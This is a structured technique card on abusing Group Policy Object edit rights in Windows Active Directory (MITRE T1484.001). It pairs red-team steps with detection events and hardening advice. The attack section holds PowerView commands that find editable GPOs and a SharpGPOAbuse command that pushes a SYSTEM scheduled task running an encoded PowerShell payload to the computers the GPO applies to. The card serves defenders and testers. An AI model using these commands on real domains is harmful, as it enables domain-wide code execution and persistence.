# [PE-POLICY-001]: GPO Abuse for Persistence & Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-001 |
| **MITRE ATT&CK v18.1** | [Domain Policy Modification: Group Policy Modification (T1484.001)](https://attack.mitre.org/techniques/T1484/001/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Group Policy Objects (GPOs) control settings across the domain. If an attacker gains edit rights over an existing GPO (linked to OUs containing servers/workstations), they can inject malicious Scheduled Tasks, Startup Scripts, or Registry keys. When computers refresh policy (default: 90 mins), the payload executes as SYSTEM.
- **Attack Surface:** Weak GPO ACLs.
- **Business Impact:** **Mass Domain Compromise**. Executing code on every machine linked to the GPO.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Edit Settings on a GPO.
- **Tools:**
    - [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
    - PowerView

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Identify Weak GPOs**
```powershell
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $MySID}
```

**Step 2: Inject Malicious Task**
Adds a scheduled task to run `malware.exe`.
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c powershell.exe -enc ..." --GPOName "VulnerableGPO"
```

**Step 3: Wait or Force**
Wait for `gpupdate` or force it if you have access to a machine.

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 5136 | Directory Service Object Modified. Look for changes to `gPCMachineExtensionNames` or `gPCUserExtensionNames`. |
| **Sysmon** | 1 | Process creation of `SharpGPOAbuse.exe` or unusual modifications to `\\domain\sysvol\...\ScheduledTasks.xml`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Delegation:** Review "Delegation" tab on all GPOs. Ensure only Domain Admins and Enterprise Admins have Edit rights.
*   **Tiering:** Ensure GPOs applying to Tier 0 (Domain Controllers) cannot be edited by Tier 1/2 admins.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-002]
> **Next Logical Step:** [LAT-CLASSIC-001]
